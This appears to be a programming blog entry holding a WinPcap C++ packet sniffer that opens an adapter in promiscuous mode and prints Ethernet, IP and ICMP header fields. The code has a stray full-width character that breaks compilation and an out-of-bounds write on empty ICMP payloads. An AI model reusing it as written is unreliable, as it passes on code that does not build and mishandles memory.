class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>  HAVE_REMOTE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pcap.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WinSock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;ws2_32&quot;</span>)</span><br> <br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br> <br><span class="hljs-comment">/* packet handler 函数原型 */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">packet_handler</span><span class="hljs-params">(u_char *param, <span class="hljs-keyword">const</span> struct pcap_pkthdr *header, <span class="hljs-keyword">const</span> u_char *pkt_data)</span></span>;<br> <br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> Ethernet_IPv4 0x0800</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> Ethernet_ARP 0x0806</span><br> <br><span class="hljs-comment">//Ethernet帧 size:14(Ethernet II)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EthernetHeader</span></span><br><span class="hljs-class">&#123;</span><br>       BYTE byDestMac[<span class="hljs-number">6</span>];<br>       BYTE bySrcMac[<span class="hljs-number">6</span>];     <br>       USHORT usType;  <br>&#125;;<br> <br><span class="hljs-comment">//TCP 头信息 size:20</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TCPHeader</span></span><br><span class="hljs-class">&#123;</span><br>       USHORT m_sSourPort;   <span class="hljs-comment">// 源端口号16bit</span><br>       USHORT m_sDestPort;   <span class="hljs-comment">// 目的端口号16bit</span><br>       ULONG m_uiSequNum;<span class="hljs-comment">// 序列号32bit</span><br>       ULONG m_uiAcknowledgeNum;  <span class="hljs-comment">// 确认号32bit</span><br>       USHORT m_sHeaderLenAndFlag;<span class="hljs-comment">// 前4位：TCP头长度；中6位：保留；后6位：标志位</span><br>       USHORT m_sWindowSize;<span class="hljs-comment">// 窗口大小16bit</span><br>       USHORT m_sCheckSum;<span class="hljs-comment">// 检验和16bit</span><br>       USHORT m_surgentPointer;<span class="hljs-comment">// 紧急数据偏移量16bit</span><br>&#125;;<br> <br><span class="hljs-comment">//ARP 头信息</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ARPHeader</span></span><br><span class="hljs-class">&#123;</span><br>       USHORT usHardwareType;<span class="hljs-comment">//Ethernet(1)</span><br>       USHORT ProtocolType;<span class="hljs-comment">//IPv4(0x0800)</span><br>       BYTE byHardwareSize;<br>       BYTE byProtocolSize;<br>       BYTE byOpcode;<span class="hljs-comment">//request(1)</span><br>       BYTE bySenderMAC[<span class="hljs-number">6</span>];<br>       DWORD dwSenderIPaddress;<br>       BYTE byTargetMAC[<span class="hljs-number">6</span>];<br>       DWORD dwTargetIPaddress;<br>&#125;;<br> <br><span class="hljs-comment">/* 4字节的IP地址 */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IPAddress</span></span><br><span class="hljs-class">&#123;</span><br>       u_char byte1;<br>       u_char byte2;<br>       u_char byte3;<br>       u_char byte4;<br>&#125; IPAddress;<br> <br><span class="hljs-comment">/* IPv4 首部 */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IPHeader</span></span><br><span class="hljs-class">&#123;</span><br>       BYTE m_byVerHLen;     <span class="hljs-comment">//4位版本+4位首部长度</span><br>       BYTE m_byTOS;                    <span class="hljs-comment">//服务类型</span><br>       USHORT m_usTotalLen; <span class="hljs-comment">//总长度</span><br>       USHORT m_usID; <span class="hljs-comment">//标识</span><br>       USHORT m_usFlagFragOffset; <span class="hljs-comment">//3位标志+13位片偏移</span><br>       BYTE m_byTTL; <span class="hljs-comment">//TTL</span><br>       BYTE m_byProtocol; <span class="hljs-comment">//协议</span><br>       USHORT m_usHChecksum; <span class="hljs-comment">//首部检验和</span><br>       DWORD m_ulSrcIP; <span class="hljs-comment">//源IP地址</span><br>       DWORD m_ulDestIP; <span class="hljs-comment">//目的IP地址</span><br>&#125;IPHeader;<br> <br><span class="hljs-comment">/* IPv4 首部 */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IPHeader2</span></span><br><span class="hljs-class">&#123;</span><br>       BYTE m_byVerHLen;     <span class="hljs-comment">//4位版本+4位首部长度</span><br>       BYTE m_byTOS;                    <span class="hljs-comment">//服务类型</span><br>       USHORT m_usTotalLen; <span class="hljs-comment">//总长度</span><br>       USHORT m_usID; <span class="hljs-comment">//标识</span><br>       USHORT m_usFlagFragOffset; <span class="hljs-comment">//3位标志+13位片偏移</span><br>       BYTE m_byTTL; <span class="hljs-comment">//TTL</span><br>       BYTE m_byProtocol; <span class="hljs-comment">//协议</span><br>       USHORT m_usHChecksum; <span class="hljs-comment">//首部检验和</span><br>       IPAddress m_ulSrcIP; <span class="hljs-comment">//源IP地址</span><br>       IPAddress m_ulDestIP; <span class="hljs-comment">//目的IP地址</span><br>&#125;IPHeader2;<br> <br><span class="hljs-comment">/* UDP 首部*/</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">UDPHeader</span></span><br><span class="hljs-class">&#123;</span><br>       USHORT src_port;          <span class="hljs-comment">// 源端口(Source port) </span><br>       USHORT dest_port;          <span class="hljs-comment">// 目的端口(Destination port) </span><br>       USHORT datalen;            <span class="hljs-comment">// UDP数据包长度(Datagram length) </span><br>       USHORT checksum;            <span class="hljs-comment">// 校验和(Checksum) </span><br>&#125; UDPHeader;<br> <br><span class="hljs-comment">//ICMP头信息</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ICMPHeader</span></span><br><span class="hljs-class">&#123;</span><br>       BYTE m_byType; <span class="hljs-comment">//类型</span><br>       BYTE m_byCode; <span class="hljs-comment">//代码</span><br>       USHORT m_usChecksum; <span class="hljs-comment">//检验和</span><br>       USHORT m_usID; <span class="hljs-comment">//标识符</span><br>       USHORT m_usSeq; <span class="hljs-comment">//序号</span><br>       ULONG m_ulTimeStamp; <span class="hljs-comment">//时间戳（非标准ICMP头部）</span><br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>       <span class="hljs-comment">//适配器的详细信息</span><br>       <span class="hljs-keyword">pcap_if_t</span> *alldevs;<br>       <span class="hljs-keyword">pcap_if_t</span> *d;<br> <br>       <span class="hljs-keyword">char</span> errorbuff[PCAP_ERRBUF_SIZE];<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Winpcap lib version:\n%s \n&quot;</span>, <span class="hljs-built_in">pcap_lib_version</span>());<br>       <span class="hljs-keyword">if</span> (<span class="hljs-built_in">pcap_findalldevs</span>( &amp;alldevs, errorbuff) == PCAP_ERROR)<br>       &#123;<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error..&quot;</span>);<br>       &#125;<br> <br>       <span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;<br>       <span class="hljs-keyword">char</span> Name[<span class="hljs-number">256</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>       <span class="hljs-comment">//过滤时用的子网掩码 </span><br>       u_int ulNetMask;<br>       <span class="hljs-keyword">for</span> (d=alldevs ;d!=<span class="hljs-literal">NULL</span>;d=d-&gt;next)<br>       &#123;<br> <br>              <span class="hljs-keyword">if</span> (index==<span class="hljs-number">1</span>)<br>              &#123;<br>                     <span class="hljs-keyword">for</span> (<span class="hljs-keyword">pcap_addr_t</span> *tmp = d-&gt;addresses, *t = <span class="hljs-literal">NULL</span>;tmp != t;tmp = tmp-&gt;next)<br>                     &#123;<br>                            <span class="hljs-comment">//掩码</span><br>                            ulNetMask = ((sockaddr_in*)(tmp-&gt;netmask))-&gt;sin_addr.S_un.S_addr;<br>                            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NetMask: %s\n&quot;</span>, <span class="hljs-built_in">inet_ntoa</span>(((sockaddr_in*)(tmp-&gt;netmask))-&gt;sin_addr));<br>                            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, ulNetMask);<br>                     &#125;<br> <br>                     <span class="hljs-built_in">strcpy</span>(Name, d-&gt;name);<br>              &#125;<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;description:%s\n&quot;</span>, d-&gt;description);<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;name:%s\n&quot;</span>, d-&gt;name);<br> <br>                    <br>              <span class="hljs-comment">/*</span><br><span class="hljs-comment">                     pcap_addr *  next     指向下一个地址的指针</span><br><span class="hljs-comment">                     sockaddr *  addr       IP地址</span><br><span class="hljs-comment">                     sockaddr *  netmask  子网掩码</span><br><span class="hljs-comment">                     sockaddr *  broadaddr   广播地址</span><br><span class="hljs-comment">                     sockaddr *  dstaddr        目的地址             </span><br><span class="hljs-comment">              */</span><br> <br>              <span class="hljs-comment">//获取 ip 地址</span><br>              <span class="hljs-keyword">for</span> (<span class="hljs-keyword">pcap_addr_t</span> *tmp = d-&gt;addresses, *t=<span class="hljs-literal">NULL</span>;tmp != t;tmp = tmp-&gt;next)<br>              &#123;<br>                     <span class="hljs-keyword">if</span> (tmp-&gt;addr-&gt;sa_family == AF_INET)<br>                     &#123;<br>                            <span class="hljs-keyword">if</span> (tmp-&gt;addr)<br>                            &#123;<br>                                   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;address:%s\n&quot;</span>, <span class="hljs-built_in">inet_ntoa</span>(((sockaddr_in*)tmp-&gt;addr)-&gt;sin_addr));<br>                            &#125;<br>                     &#125;<br>              &#125;<br> <br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;————————————————————\n&quot;</span>);<br>              index++;<br> <br>       &#125;<br> <br>       <span class="hljs-keyword">pcap_t</span> *adHande = <span class="hljs-built_in">pcap_open</span>(Name,<br>              <span class="hljs-number">65536</span>,<br>              PCAP_OPENFLAG_PROMISCUOUS,<span class="hljs-comment">// 混杂模式</span><br>              <span class="hljs-number">1000</span>, <span class="hljs-literal">NULL</span>,<br>              errorbuff);<br> <br>       <span class="hljs-keyword">if</span> (adHande!=<span class="hljs-literal">NULL</span>)<br>       &#123;<br>              <span class="hljs-keyword">if</span> (<span class="hljs-built_in">pcap_datalink</span>(adHande)==DLT_IEEE802)<br>              &#123;<br>                     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DLT_IEEE802\n&quot;</span>);<br>              &#125;<br> <br>              <span class="hljs-keyword">if</span> (<span class="hljs-built_in">pcap_datalink</span>(adHande) == DLT_EN10MB)<br>              &#123;<br>                     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DLT_EN10MB\n&quot;</span>);<br>              &#125;<br>              <span class="hljs-keyword">if</span> (<span class="hljs-built_in">pcap_datalink</span>(adHande) != DLT_EN10MB)<br>              &#123;<br>                     <span class="hljs-built_in">pcap_freealldevs</span>(alldevs);<br>              &#125;     <br>              <span class="hljs-comment">/* 不用关心掩码，在这个过滤器中，它不会被使用 */</span><br>              ulNetMask = <span class="hljs-number">0xffffffff</span>;<br>              bpf_program bpf_pro = &#123; <span class="hljs-number">0</span> &#125;;<br>              <span class="hljs-keyword">if</span> (<span class="hljs-built_in">pcap_compile</span>(adHande, &amp;bpf_pro, <span class="hljs-string">&quot;tcp or ip or icmp  or arp&quot;</span>, <span class="hljs-number">1</span>, ulNetMask) &lt; <span class="hljs-number">0</span>)<br>              &#123;<br>                     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-----------&gt;error:pcap_compile\n&quot;</span>);<br>                     <span class="hljs-built_in">pcap_freealldevs</span>(alldevs);<br>                     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>              &#125;<br>              <span class="hljs-comment">//设置过滤条件</span><br>              <span class="hljs-keyword">if</span> (<span class="hljs-built_in">pcap_setfilter</span>(adHande, &amp;bpf_pro) &lt; <span class="hljs-number">0</span>)<br>              &#123;<br>                     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-----------&gt;error:pcap_setfilter\n&quot;</span>);<br>                     <span class="hljs-built_in">pcap_freealldevs</span>(alldevs);<br>                     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> <br>              &#125;<br> <br>      <br>              <span class="hljs-comment">//开始处理函数</span><br>              <span class="hljs-built_in">pcap_loop</span>(adHande, <span class="hljs-number">0</span>, packet_handler, <span class="hljs-literal">NULL</span>);<br>             <br>              <span class="hljs-built_in">pcap_freealldevs</span>(alldevs);<br> <br>              <span class="hljs-comment">//释放一个过滤器</span><br>              <span class="hljs-built_in">pcap_freecode</span>(&amp;bpf_pro);。<br> <br>              <span class="hljs-built_in">pcap_close</span>(adHande);<br>       &#125;<br>       <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br> <br><span class="hljs-comment">//开始处理获取的数据包</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">packet_handler</span><span class="hljs-params">(u_char *param, <span class="hljs-keyword">const</span> struct pcap_pkthdr *header, <span class="hljs-keyword">const</span> u_char *pkt_data)</span></span><br><span class="hljs-function"></span>&#123;<br>       <span class="hljs-comment">//打印MAC地址</span><br>       <span class="hljs-keyword">int</span> j;<br>       EthernetHeader *ethernet = (EthernetHeader*)pkt_data;<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Source MAC:&quot;</span>);<br>       <span class="hljs-keyword">for</span> (j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">6</span>;j++)<br>       &#123;<br>              <span class="hljs-keyword">if</span> (j==<span class="hljs-number">5</span>)<br>                     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%2x&quot;</span>, ethernet-&gt;bySrcMac[j]);<br>              <span class="hljs-keyword">else</span>      <br>                     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%2x:&quot;</span>, ethernet-&gt;bySrcMac[j]);<br>       &#125;<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\t&quot;</span>);<br> <br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dest MAC:&quot;</span>);<br>       <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>;j &lt; <span class="hljs-number">6</span>;j++)<br>       &#123;<br>              <span class="hljs-keyword">if</span> (j == <span class="hljs-number">5</span>)<br>                     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%2x&quot;</span>, ethernet-&gt;byDestMac[j]);<br>              <span class="hljs-keyword">else</span><br>                     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%2x:&quot;</span>, ethernet-&gt;byDestMac[j]);<br>       &#125;<br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br> <br> <br> <br>       <span class="hljs-comment">// 从 IP层开始读取数据！！偏移 14字节</span><br>       <span class="hljs-comment">//14为以太网帧头部长度</span><br>      <br>       <span class="hljs-comment">//获取原始的IP层协议</span><br>       IPHeader2* iphdr = (IPHeader2*)(pkt_data + <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(EthernetHeader));<br>       IPHeader* iphdr0 = (IPHeader*)(pkt_data + <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(EthernetHeader));<br>      <br> <br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d.%d.%d.%d\t%d.%d.%d.%d\n&quot;</span>,<br>              iphdr-&gt;m_ulSrcIP.byte1, iphdr-&gt;m_ulSrcIP.byte2,<br>              iphdr-&gt;m_ulSrcIP.byte3, iphdr-&gt;m_ulSrcIP.byte4,<br>              iphdr-&gt;m_ulDestIP.byte1, iphdr-&gt;m_ulDestIP.byte2,<br>              iphdr-&gt;m_ulDestIP.byte3, iphdr-&gt;m_ulDestIP.byte4<br>       );<br>      <br>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d.%05d\tlen:%d\n&quot;</span>,header-&gt;ts.tv_sec, header-&gt;ts.tv_usec, header-&gt;len);<br> <br>       <span class="hljs-comment">//icmp</span><br>       <span class="hljs-keyword">if</span> (iphdr-&gt;m_byProtocol==IPPROTO_ICMP)<br>       &#123;<br>              ICMPHeader*icmphdr = (ICMPHeader*)(pkt_data + <span class="hljs-number">14</span> + <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(IPHeader));<br> <br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Type:%d\t%d\n&quot;</span>, icmphdr-&gt;m_byType, icmphdr-&gt;m_ulTimeStamp);<br> <br>              <span class="hljs-keyword">char</span> data[<span class="hljs-number">100</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>              <span class="hljs-built_in">memcpy</span>(data, ((<span class="hljs-keyword">char</span>*)icmphdr) + <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(ICMPHeader), <span class="hljs-number">50</span>);<br>              data[<span class="hljs-built_in">strlen</span>(data) - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Data:%s\n&quot;</span>, data);<br> <br>       &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
</search>
